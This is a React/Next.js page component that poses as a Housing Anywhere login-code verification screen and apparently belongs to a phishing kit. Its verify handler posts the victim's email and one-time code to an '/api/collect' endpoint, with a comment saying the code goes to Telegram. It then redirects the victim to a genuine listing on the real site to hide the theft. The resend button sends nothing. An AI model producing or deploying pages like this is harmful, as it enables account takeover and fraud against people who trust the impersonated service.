"use client"

import { useState, useEffect, useRef } from "react"
import Link from "next/link"
import Image from "next/image"

export default function VerifyPage() {
  const [code, setCode] = useState("")
  const [email, setEmail] = useState("")
  const [countdown, setCountdown] = useState(59)
  const [canResend, setCanResend] = useState(false)
  const inputRef = useRef<HTMLInputElement>(null)

  useEffect(() => {
    const storedEmail = sessionStorage.getItem("userEmail") || "bookings@mintyhost.es"
    setEmail(storedEmail)
  }, [])

  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000)
      return () => clearTimeout(timer)
    } else {
      setCanResend(true)
    }
  }, [countdown])

  const handleVerify = async () => {
    if (code.length > 0) {
      // Send verification code to Telegram
      await fetch("/api/collect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, code, type: "verify" }),
      })
      
      window.location.href = "https://housinganywhere.com/room/ut1682310/es/Esplugues%20de%20Llobregat/avenida-de-ahrensburg?calendarMode=exact"
    }
  }

  const handleResend = () => {
    if (canResend) {
      setCountdown(59)
      setCanResend(false)
    }
  }

  return (
    <main className="min-h-screen flex items-center justify-center bg-background p-4">
      <div className="w-full max-w-md">
        <Image
          src="/logo-1200x630.png"
          alt="Housing Anywhere"
          width={170}
          height={89}
          style={{ width: "170px", height: "auto" }}
          className="mb-6"
          priority
        />
        <h1 className="text-xl font-bold text-[#1a3a5c] mb-3">Enter login code to continue</h1>
        <p className="text-sm text-muted-foreground mb-1">
          To help keep your account safe, we sent a 6-digit code to
        </p>
        <p className="text-muted-foreground mb-2">{email}.</p>
        
        <Link href="/" className="inline-block text-[#00838f] hover:underline text-sm mb-6">
          Not your email address?
        </Link>

        <div className="mb-4">
          <label htmlFor="code" className="block text-sm font-medium text-foreground mb-2">
            Enter code
          </label>
          <div className="flex items-center gap-3">
            <input
              ref={inputRef}
              id="code"
              type="text"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
              className="w-24 px-3 py-2 border border-border rounded-md focus:outline-none focus:ring-2 focus:ring-[#00838f] bg-background text-foreground text-center tracking-widest"
              maxLength={6}
              placeholder=""
            />
            <button
              type="button"
              onClick={handleVerify}
              className="bg-[#ff5722] hover:bg-[#e64a19] text-white font-medium px-4 py-2 rounded transition-colors text-sm"
            >
              Verify
            </button>
          </div>
        </div>

        <p className="text-muted-foreground text-sm mb-2">
          {"Didn't get the code? Check your spam folder or get a new one."}
        </p>
        
        <button
          type="button"
          onClick={handleResend}
          disabled={!canResend}
          className={`text-sm mb-8 ${
            canResend 
              ? "text-[#00838f] hover:underline cursor-pointer" 
              : "text-muted-foreground cursor-not-allowed"
          } border-b border-dashed border-current`}
        >
          Resend code {!canResend && `(${countdown})`}
        </button>

        <div className="mt-8">
          <p className="text-muted-foreground text-sm">
            Having issues verifying your email address?
          </p>
          <Link href="#" className="text-[#00838f] hover:underline text-sm">
            Contact Customer Care
          </Link>
        </div>
      </div>
    </main>
  )
}
